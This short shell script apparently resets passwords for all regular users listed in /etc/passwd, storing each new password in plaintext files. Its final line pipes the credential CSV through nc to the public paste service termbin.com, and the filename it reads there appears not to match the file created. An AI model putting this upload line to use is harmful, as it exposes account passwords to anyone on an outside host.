#!/bin/sh
rm u.txt
rm lists.txt
rm `hostname`.csv
awk -F ':' '$3>=1000 {print $1}' /etc/passwd > u.txt
STR="hey"
for user in `more u.txt`
do
	echo "Enter new password for" $user"."
	read STR
	echo $user":"$STR >> lists.txt
	echo $user","$STR >> `hostname`.csv
done
chpasswd < lists.txt
(cat hostname.csv | nc termbin.com 9999) && rm -f `hostname`.csv
rm u.txt
rm lists.txt
